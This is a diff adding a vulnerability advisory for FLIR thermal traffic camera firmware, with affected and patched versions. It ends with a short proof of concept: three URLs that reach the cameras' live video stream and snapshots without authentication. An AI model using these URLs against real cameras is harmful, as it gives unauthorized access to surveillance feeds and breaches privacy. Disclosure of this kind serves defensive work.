@@ -1,0 +1,43 @@
+# Exploit Title: FLIR Thermal Traffic Cameras 1.01-0bb5b27 - RTSP Stream Disclosure
+# Author: Gjoko 'LiquidWorm' Krstic
+# Date: 2018-10-06
+# Vendor: https://www.flir.com
+# Link: https://www.flir.com/security/best-practices-for-cybersecurity/
+# CVE: N/A
+# Tested on: nginx/1.12.1, nginx/1.10.2, nginx/1.8.0, Websocket/13 (RFC 6455)
+
+# Affected firmware version: V1.01-0bb5b27 (TrafiOne)     Codename: TrafiOne
+#                           E1.00.09      (TI BPL2 EDGE) Codename: TIIP4EDGE
+#                           V1.02.P01     (TI x-stream)  Codename: TIIP2
+#                           V1.05.P01     (ThermiCam)    Codename: ThermiCam
+#                           V1.04.P02     (ThermiCam)    Codename: ThermiCam
+#                           V1.04         (ThermiCam)    Codename: ThermiCam
+#                           V1.01.P02     (ThermiCam)    Codename: ThermiCam
+#                           V1.05.P03     (TrafiSense)   Codename: TrafiSense
+#                           V1.06         (VIP-IP)       Codename: VIP-IP
+#                           V1.02.P02     (TrafiRadar)   Codename: TrafiRadar
+
+# Vendor patched firmware version:
+#
+# Product name                Firmware      Released 
+# ----------------------------------------------------
+# ThermiCam / TrafiSense      E1.06.03      17.09.2018
+# TI BPL2 EDGE                V1.00         17.09.2018
+# TI x-stream                 E1.03.02      17.09.2018
+# TrafiOne                    E1.02.02      17.09.2018
+# ----------------------------------------------------
+
+# Description
+# FLIR thermal traffic cameras suffer from an unauthenticated and unauthorized
+# live RTSP video stream access.
+
+# Advisory ID: ZSL-2018-5489
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5489.php
+
+# Simple PoC:
+
+http://Target/live.mjpeg?id=1
+
+rtsp://Target/mpeg4
+
+http://Target/snapshot.jpg
